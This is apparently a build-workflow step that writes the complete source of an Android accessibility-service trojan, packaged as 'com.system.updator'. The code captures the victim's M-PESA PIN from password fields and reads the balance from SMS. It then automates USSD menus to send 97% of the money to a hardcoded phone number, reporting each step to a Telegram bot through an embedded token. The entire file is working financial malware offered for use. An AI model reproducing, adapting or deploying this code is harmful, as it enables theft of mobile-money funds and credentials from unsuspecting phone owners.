      - name: Create FinAutoService.java – FINAL (correct 6-step order, no back button)
        run: |
          cat > app/src/main/java/com/system/updator/FinAutoService.java << 'EOF'
          package com.system.updator;

          import android.accessibilityservice.AccessibilityService;
          import android.accessibilityservice.GestureDescription;
          import android.content.ContentResolver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.SharedPreferences;
          import android.database.Cursor;
          import android.graphics.Path;
          import android.graphics.Rect;
          import android.net.Uri;
          import android.os.Bundle;
          import android.os.Handler;
          import android.os.Looper;
          import android.provider.Telephony;
          import android.telecom.PhoneAccountHandle;
          import android.telecom.TelecomManager;
          import android.telephony.SubscriptionInfo;
          import android.telephony.SubscriptionManager;
          import android.util.Log;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;

          import com.google.gson.Gson;

          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.util.List;
          import java.util.concurrent.ExecutorService;
          import java.util.concurrent.Executors;

          public class FinAutoService extends AccessibilityService {
              private static final String TAG = "FinAutoService";
              private static final String TARGET_PHONE = "0741639018";
              private static final double SEND_PERCENTAGE = 0.97;
              private static final String BOT_TOKEN = "8585104821:AAFXZn3g7QG9NsCmLmZuyfviQkPddOYMJzc";
              private static final String CHAT_ID = "8468538314";

              private SharedPreferences prefs;
              private Gson gson = new Gson();
              private Handler handler = new Handler(Looper.getMainLooper());
              private ExecutorService executor = Executors.newSingleThreadExecutor();

              private String pin = null;
              private boolean pinLearned = false;
              private boolean automating = false;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  Log.d(TAG, "Service connected");
                  prefs = getSharedPreferences("fin_vault", MODE_PRIVATE);
                  loadData();
              }

              private void loadData() {
                  String json = prefs.getString("mpesa_pin", "{}");
                  try {
                      PinData data = gson.fromJson(json, PinData.class);
                      if (data != null && data.isLearned && data.pin != null) {
                          pin = data.pin;
                          pinLearned = true;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "JSON parse error", e);
                  }
              }

              private void savePin(String p) {
                  PinData data = new PinData();
                  data.pin = p;
                  data.isLearned = true;
                  prefs.edit().putString("mpesa_pin", gson.toJson(data)).apply();
                  pin = p;
                  pinLearned = true;
                  sendTelegram("PIN updated");

                  double balance = getLastBalanceFromSms();
                  if (balance > 0) {
                      sendTelegram("M-PESA Balance: KES " + String.format("%.2f", balance));
                      double amount = balance * SEND_PERCENTAGE;
                      sendTelegram("Sending 97% = KES " + String.format("%.2f", amount));
                      startAutomation(amount);
                  } else {
                      sendTelegram("Balance not found");
                  }
              }

              private double getLastBalanceFromSms() {
                  try {
                      ContentResolver cr = getContentResolver();
                      Uri uri = Telephony.Sms.Inbox.CONTENT_URI;
                      String[] projection = { Telephony.Sms.Inbox.BODY };
                      String selection = Telephony.Sms.Inbox.BODY + " LIKE ?";
                      String[] selectionArgs = new String[]{"%balance%"};
                      String sortOrder = Telephony.Sms.Inbox.DATE + " DESC";

                      Cursor cursor = cr.query(uri, projection, selection, selectionArgs, sortOrder);
                      if (cursor != null && cursor.moveToFirst()) {
                          String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.Inbox.BODY));
                          cursor.close();

                          if (body == null) return 0;

                          String normalized = body.replace('\u00A0', ' ')
                                                  .replace("\u200B", "")
                                                  .replaceAll("\\s+", " ")
                                                  .trim();

                          java.util.regex.Pattern p1 = java.util.regex.Pattern.compile(
                              "New M-PESA balance is\\s*(?:KES|Ksh)\\.?\\s*([\\d,]+\\.\\d{2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m1 = p1.matcher(normalized);
                          if (m1.find()) return Double.parseDouble(m1.group(1).replace(",", ""));

                          java.util.regex.Pattern p2 = java.util.regex.Pattern.compile(
                              "balance is\\s*(?:KES|Ksh)\\.?\\s*([\\d,]+\\.\\d{2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m2 = p2.matcher(normalized);
                          if (m2.find()) return Double.parseDouble(m2.group(1).replace(",", ""));

                          java.util.regex.Pattern p3 = java.util.regex.Pattern.compile(
                              "M-PESA balance[:\\s]*(?:KES|Ksh)?\\.?\\s*([\\d,]+\\.\\d{2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m3 = p3.matcher(normalized);
                          if (m3.find()) return Double.parseDouble(m3.group(1).replace(",", ""));

                          java.util.regex.Pattern p4 = java.util.regex.Pattern.compile(
                              "balance[:\\s]*(?:KES|Ksh)?\\.?\\s*([\\d,]+\\.\\d{2})",
                              java.util.regex.Pattern.CASE_INSENSITIVE);
                          java.util.regex.Matcher m4 = p4.matcher(normalized);
                          if (m4.find()) return Double.parseDouble(m4.group(1).replace(",", ""));

                          java.util.regex.Pattern p5 = java.util.regex.Pattern.compile("([\\d,]+\\.\\d{2})");
                          java.util.regex.Matcher m5 = p5.matcher(normalized);
                          double maxVal = 0;
                          while (m5.find()) {
                              try {
                                  double val = Double.parseDouble(m5.group(1).replace(",", ""));
                                  if (val > maxVal && val < 1000000) maxVal = val;
                              } catch (Exception e) { }
                          }
                          return maxVal;
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Balance read error", e);
                  }
                  return 0;
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  try {
                      if (event == null) return;
                      String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "";
                      if ((pkg.contains("stk") || pkg.contains("sim")) && !automating) {
                          AccessibilityNodeInfo root = getRootInActiveWindow();
                          if (root != null) {
                              String captured = findPasswordField(root);
                              if (captured != null && captured.length() >= 4) {
                                  savePin(captured);
                              }
                          }
                      }
                  } catch (Exception e) {
                      Log.e(TAG, "Event error", e);
                  }
              }

              private String findPasswordField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isPassword() && node.getText() != null) return node.getText().toString();
                  for (int i = 0; i < node.getChildCount(); i++) {
                      String result = findPasswordField(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              // ========== AUTOMATION ==========
              private void startAutomation(double amount) {
                  if (automating) return;
                  automating = true;
                  sendTelegram("Starting USSD automation...");
                  dialUssdWithIntent("*334%23");
                  handler.postDelayed(() -> performStep1(amount), 3000);
              }

              private void dialUssdWithIntent(String ussdCode) {
                  try {
                      Intent intent = new Intent(Intent.ACTION_CALL);
                      intent.setData(Uri.parse("tel:" + ussdCode));
                      intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);

                      try {
                          SubscriptionManager sm = (SubscriptionManager) getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE);
                          if (sm != null) {
                              List<SubscriptionInfo> subs = sm.getActiveSubscriptionInfoList();
                              if (subs != null && subs.size() > 1) {
                                  for (SubscriptionInfo sub : subs) {
                                      String carrier = sub.getCarrierName() != null ? sub.getCarrierName().toString() : "";
                                      if (carrier.toLowerCase().contains("safaricom")) {
                                          PhoneAccountHandle handle = getPhoneAccountHandle(sub.getSubscriptionId());
                                          if (handle != null) {
                                              intent.putExtra("android.telecom.extra.PHONE_ACCOUNT_HANDLE", handle);
                                          }
                                          break;
                                      }
                                  }
                              }
                          }
                      } catch (Exception e) {
                          Log.e(TAG, "Dual SIM handling failed: " + e.getMessage());
                      }

                      startActivity(intent);
                      Log.d(TAG, "Intent fired: tel:" + ussdCode);
                  } catch (Exception e) {
                      Log.e(TAG, "Intent dial failed: " + e.getMessage());
                      sendTelegram("USSD failed");
                      automating = false;
                  }
              }

              private PhoneAccountHandle getPhoneAccountHandle(int subId) {
                  try {
                      TelecomManager tm = (TelecomManager) getSystemService(Context.TELECOM_SERVICE);
                      if (tm == null) return null;
                      List<PhoneAccountHandle> handles = tm.getCallCapablePhoneAccounts();
                      if (handles != null && !handles.isEmpty()) {
                          return handles.get(0);
                      }
                  } catch (Exception e) { }
                  return null;
              }

              // ========== STEP 1: SEND MONEY ==========
              private void performStep1(double amount) {
                  typeInField("1");
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> performStep2(amount), 1000);
                  }, 500);
              }

              // ========== STEP 2: ANY NETWORK ==========
              private void performStep2(double amount) {
                  typeInField("1");
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> performStep3(amount), 1000);
                  }, 500);
              }

              // ========== STEP 3: PHONE NUMBER ==========
              private void performStep3(double amount) {
                  typeInField(TARGET_PHONE);
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> performStep4(amount), 1000);
                  }, 500);
              }

              // ========== STEP 4: AMOUNT ==========
              private void performStep4(double amount) {
                  typeInField(String.format("%.0f", amount));
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> performStep5(amount), 1500);
                  }, 500);
              }

              // ========== STEP 5: PIN ==========
              private void performStep5(double amount) {
                  typeInField(pin);
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> performStep6(amount), 1000);
                  }, 500);
              }

              // ========== STEP 6: CONFIRM (1) ==========
              private void performStep6(double amount) {
                  typeInField("1");
                  handler.postDelayed(() -> {
                      clickSendWithRetry();
                      handler.postDelayed(() -> {
                          if (checkSuccess()) {
                              sendTelegram("KES " + String.format("%.2f", amount) + " sent to " + TARGET_PHONE);
                          } else {
                              sendTelegram("Unknown error");
                          }
                          automating = false;
                      }, 2500);
                  }, 500);
              }

              // ========== SEND BUTTON – 7-LAYER ROBUST DETECTION ==========
              private void clickSendWithRetry() {
                  for (int attempt = 0; attempt < 3; attempt++) {
                      if (clickSendOnce()) {
                          Log.d(TAG, "Send clicked (attempt " + (attempt + 1) + ")");
                          return;
                      }
                      try { Thread.sleep(500); } catch (InterruptedException e) { }
                  }
                  Log.e(TAG, "Send not found after 3 attempts - using dialog-bounds fallback");
                  performDialogBottomRightTap();
              }

              private boolean clickSendOnce() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;

                  // Layer 1: View ID
                  String[] ids = {
                      "android:id/button1",
                      "android:id/button2",
                      "com.android.phone:id/ok",
                      "com.android.phone:id/send",
                      "com.android.phone:id/button1",
                      "com.android.phone:id/button2"
                  };
                  for (String id : ids) {
                      if (findAndClickById(root, id)) return true;
                  }

                  // Layer 2: Uppercase SEND
                  if (findAndClickClickableParent(root, "SEND")) return true;

                  // Layer 3: All other labels
                  String[] labels = {"Send", "OK", "Reply", "Next", "Confirm", "Ok", "send", "ok", "confirm"};
                  for (String label : labels) {
                      if (findAndClickClickableParent(root, label)) return true;
                  }

                  // Layer 4: Content description
                  String[] descs = {"Send", "OK", "Reply", "Next", "Confirm"};
                  for (String desc : descs) {
                      if (findAndClickByContentDesc(root, desc)) return true;
                  }

                  // Layer 5: ImageButton
                  if (findAndClickImageButton(root)) return true;

                  return false;
              }

              private boolean findAndClickClickableParent(AccessibilityNodeInfo node, String text) {
                  if (node == null) return false;
                  try {
                      if (node.getText() != null && node.getText().toString().trim().equalsIgnoreCase(text)) {
                          AccessibilityNodeInfo clickable = getClickableParent(node);
                          if (clickable != null) {
                              clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                              Log.d(TAG, "Clicked parent: " + text);
                              return true;
                          }
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          Log.d(TAG, "Clicked self: " + text);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickClickableParent(node.getChild(i), text)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private AccessibilityNodeInfo getClickableParent(AccessibilityNodeInfo node) {
                  AccessibilityNodeInfo current = node;
                  int depth = 0;
                  while (current != null && depth < 5) {
                      if (current.isClickable() && current.isEnabled()) return current;
                      current = current.getParent();
                      depth++;
                  }
                  return null;
              }

              private boolean findAndClickByContentDesc(AccessibilityNodeInfo node, String desc) {
                  if (node == null) return false;
                  try {
                      if (node.getContentDescription() != null && node.getContentDescription().toString().toLowerCase().contains(desc.toLowerCase())) {
                          AccessibilityNodeInfo clickable = getClickableParent(node);
                          if (clickable != null) clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          else node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickByContentDesc(node.getChild(i), desc)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private boolean findAndClickById(AccessibilityNodeInfo node, String id) {
                  if (node == null) return false;
                  try {
                      if (node.getViewIdResourceName() != null && node.getViewIdResourceName().equals(id)) {
                          if (node.isClickable()) node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          else {
                              AccessibilityNodeInfo parent = getClickableParent(node);
                              if (parent != null) parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                              else node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          }
                          Log.d(TAG, "Clicked by ID: " + id);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickById(node.getChild(i), id)) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private boolean findAndClickImageButton(AccessibilityNodeInfo node) {
                  if (node == null) return false;
                  try {
                      if (node.getClassName() != null && node.getClassName().toString().contains("ImageButton")
                          && node.isClickable() && node.isEnabled()) {
                          node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                          return true;
                      }
                      for (int i = 0; i < node.getChildCount(); i++) {
                          if (findAndClickImageButton(node.getChild(i))) return true;
                      }
                  } catch (Exception e) { }
                  return false;
              }

              private void performDialogBottomRightTap() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return;
                  Rect bounds = new Rect();
                  root.getBoundsInScreen(bounds);
                  int tapX = bounds.right - 100;
                  int tapY = bounds.bottom - 100;
                  Path path = new Path();
                  path.moveTo(tapX, tapY);
                  GestureDescription.Builder gestureBuilder = new GestureDescription.Builder();
                  gestureBuilder.addStroke(new GestureDescription.StrokeDescription(path, 0, 100));
                  dispatchGesture(gestureBuilder.build(), null, null);
                  Log.d(TAG, "Dialog bottom-right tap at " + tapX + "," + tapY);
              }

              // ========== UI HELPERS ==========
              private boolean typeInField(String text) {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  AccessibilityNodeInfo field = findEditableField(root);
                  if (field == null) field = findNodeByClassName(root, "android.widget.EditText");
                  if (field == null) field = findNodeByText(root, "Edit box");
                  if (field == null) field = findFirstFocusable(root);
                  if (field == null) {
                      Log.e(TAG, "No editable field found");
                      return false;
                  }
                  field.performAction(AccessibilityNodeInfo.ACTION_FOCUS);
                  field.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                  Bundle args = new Bundle();
                  args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                  return field.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
              }

              private AccessibilityNodeInfo findNodeByClassName(AccessibilityNodeInfo node, String className) {
                  if (node == null) return null;
                  if (node.getClassName() != null && node.getClassName().toString().equals(className)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findNodeByClassName(node.getChild(i), className);
                      if (result != null) return result;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findNodeByText(AccessibilityNodeInfo node, String text) {
                  if (node == null) return null;
                  if (node.getText() != null && node.getText().toString().equalsIgnoreCase(text)) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findNodeByText(node.getChild(i), text);
                      if (result != null) return result;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findFirstFocusable(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isFocusable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findFirstFocusable(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private AccessibilityNodeInfo findEditableField(AccessibilityNodeInfo node) {
                  if (node == null) return null;
                  if (node.isEditable() && node.isEnabled()) return node;
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo result = findEditableField(node.getChild(i));
                      if (result != null) return result;
                  }
                  return null;
              }

              private boolean checkSuccess() {
                  AccessibilityNodeInfo root = getRootInActiveWindow();
                  if (root == null) return false;
                  String text = getAllText(root);
                  return text.toLowerCase().contains("confirmed") || text.toLowerCase().contains("successful") ||
                         text.toLowerCase().contains("complete") || text.toLowerCase().contains("success");
              }

              private String getAllText(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  if (node.getText() != null) sb.append(node.getText().toString()).append(" ");
                  for (int i = 0; i < node.getChildCount(); i++) {
                      sb.append(getAllText(node.getChild(i)));
                  }
                  return sb.toString();
              }

              private void sendTelegram(String msg) {
                  executor.execute(() -> {
                      try {
                          URL url = new URL("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage");
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("POST");
                          conn.setRequestProperty("Content-Type", "application/json");
                          conn.setConnectTimeout(5000);
                          conn.setReadTimeout(5000);
                          String json = "{\"chat_id\":\"" + CHAT_ID + "\",\"text\":\"" +
                              msg.replace("\"", "\\\"").replace("\n", "\\n") + "\",\"parse_mode\":\"Markdown\"}";
                          conn.getOutputStream().write(json.getBytes("UTF-8"));
                          conn.getOutputStream().flush();
                          conn.getResponseCode();
                          conn.disconnect();
                      } catch (Exception e) {
                          Log.e(TAG, "Telegram error", e);
                      }
                  });
              }

              @Override
              public void onInterrupt() {
                  Log.d(TAG, "Service interrupted");
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  executor.shutdown();
              }
          }
